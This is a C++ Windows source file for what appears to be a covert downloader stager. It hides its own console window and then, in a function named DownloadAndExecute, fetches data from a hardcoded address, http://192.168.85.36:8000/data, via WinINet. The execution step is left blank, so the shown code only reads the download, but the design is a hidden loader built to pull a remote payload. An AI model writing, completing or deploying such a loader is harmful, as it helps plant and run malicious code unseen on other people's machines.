#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <vector>
#include <string>

#pragma comment(lib, "wininet.lib")



void DownloadAndExecute() {
    HINTERNET hInternet = InternetOpenA("Downloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hFile = InternetOpenUrlA(hInternet, "http://192.168.85.36:8000/data", NULL, 0, INTERNET_FLAG_RELOAD, 0);

    if (hFile) {
        char buffer[1024];
        DWORD bytesRead;
        std::string rawData;

        while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
            rawData.append(buffer, bytesRead);
        }

        
        
        InternetCloseHandle(hFile);
    }
    InternetCloseHandle(hInternet);
}

int main() {
    
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    DownloadAndExecute();
    return 0;
}
